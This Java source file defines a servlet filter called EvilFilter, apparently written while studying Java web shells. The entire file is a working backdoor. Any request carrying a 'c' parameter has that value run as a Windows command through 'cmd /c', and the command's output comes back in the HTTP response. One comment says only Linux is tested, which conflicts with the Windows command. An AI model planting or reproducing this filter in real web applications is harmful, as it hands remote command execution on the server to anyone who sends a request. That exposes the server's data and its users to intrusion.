package Filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

//this Filter is used to execute any command on windows

//@WebFilter("/hello")
public class EvilFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("evil Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("evil filter 执行过滤过程");
        //测试只考虑linux环境下
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        if (request.getParameter("c") != null){
            StringBuilder command=new StringBuilder("cmd /c ");
            command.append(request.getParameter("c"));
            InputStream inputStream = Runtime.getRuntime().exec(command.toString()).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }

        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("evil filter 销毁！");
    }
}
